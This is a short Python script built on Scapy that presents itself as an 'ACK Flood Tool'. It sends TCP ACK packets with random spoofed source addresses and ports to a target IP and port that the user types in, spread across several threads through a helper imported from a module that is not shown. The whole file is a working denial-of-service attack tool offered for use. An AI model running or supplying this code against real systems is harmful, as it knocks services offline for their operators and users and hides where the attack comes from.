from scapy.all import *
from scapy.layers.inet import IP, TCP
from utils import *


def ack_flood(dst_ip, dst_port, one_work_num):
    for i in range(one_work_num):
        # IPlayer
        srcIP = random_ip()
        IPlayer = IP(src=srcIP, dst=dst_ip)
        # TCPlayer
        srcPort = randomPort()
        TCPlayer = TCP(sport=srcPort, dport=int(dst_port), flags="A", ack=random.randint(1, 4000000000))
        # 发送包
        ack_packet = IPlayer / TCPlayer
        send(ack_packet)


if __name__ == '__main__':
    print("#" * 30)
    print("# Welcome to ACK Flood Tool  #")
    print("#" * 30)
    # 输入目标IP和端口
    dst_ip_test = input("Target IP : ")
    dst_port_test = input("Target PORT : ")
    start_attack(ack_flood, thread_num=10, one_work_num=10, dst_ip=dst_ip_test, dst_port=dst_port_test)
